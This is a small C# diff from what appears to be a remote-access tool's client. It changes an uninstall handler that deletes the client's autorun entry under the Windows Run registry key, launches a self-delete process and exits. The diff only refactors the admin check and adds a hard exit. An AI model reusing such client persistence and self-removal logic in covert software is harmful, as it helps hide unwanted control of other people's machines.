@@ -18,7 +18,7 @@ namespace Client.Handle_Packet
             {
                 try
                 {
-                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
+                    if (!Methods.IsAdmin())
                         Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run").DeleteValue(Path.GetFileName(Settings.ClientFullPath));
                     else
                     {
@@ -51,6 +51,7 @@ namespace Client.Handle_Packet
             {
                 Process.Start(Del);
                 Methods.ClientExit();
+                Environment.Exit(0);
             }
         }
     }
